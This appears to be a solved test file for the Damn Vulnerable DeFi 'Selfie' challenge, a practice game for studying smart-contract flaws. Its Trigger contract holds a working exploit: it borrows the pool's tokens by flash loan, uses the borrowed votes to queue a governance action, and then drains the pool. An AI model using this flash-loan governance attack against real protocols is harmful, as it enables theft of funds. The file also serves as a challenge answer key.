// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import "forge-std/Test.sol";
import {DamnValuableVotes} from "damn-vulnerable-defi/DamnValuableVotes.sol";
import {SimpleGovernance} from "damn-vulnerable-defi/selfie/SimpleGovernance.sol";
import {SelfiePool} from "damn-vulnerable-defi/selfie/SelfiePool.sol";

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Trigger is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    SelfiePool internal pool;
    SimpleGovernance internal governance;
    address internal recovery;

    uint256 internal action_id;

    constructor(
        SelfiePool pool_,
        SimpleGovernance governance_,
        address recovery_
    ) {
        pool = pool_;
        governance = governance_;
        recovery = recovery_;
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        DamnValuableVotes(token).delegate(address(this));
        action_id = governance.queueAction(
            address(pool),
            0,
            abi.encodeCall(SelfiePool.emergencyExit, (recovery))
        );
        DamnValuableVotes(token).approve(address(pool), type(uint256).max);
        return CALLBACK_SUCCESS;
    }

    function exec() external {
        governance.executeAction(action_id);
    }
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        vm.warp(1);
        // deploy Trigger
        Trigger trigger = new Trigger(pool, governance, recovery);
        // propose an action
        pool.flashLoan(trigger, address(token), TOKENS_IN_POOL, new bytes(0));
        // wait for timelock
        vm.warp(block.timestamp + 3 days);
        // execute an action
        trigger.exec();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}
